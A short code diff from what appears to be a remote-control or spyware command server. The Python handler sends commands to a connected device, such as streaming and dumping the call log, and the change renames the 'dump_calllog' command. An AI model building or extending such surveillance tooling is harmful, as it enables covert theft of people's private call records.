@@ -142,7 +142,7 @@ def handle_client(client_socket, addr):
             start_streaming(client_socket, mode)
             continue
 
-        if command.startswith("dump_calllog"):
+        if command.startswith("dump_call_log"):
             client_socket.send(command.encode('utf-8'))
             output = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + output)
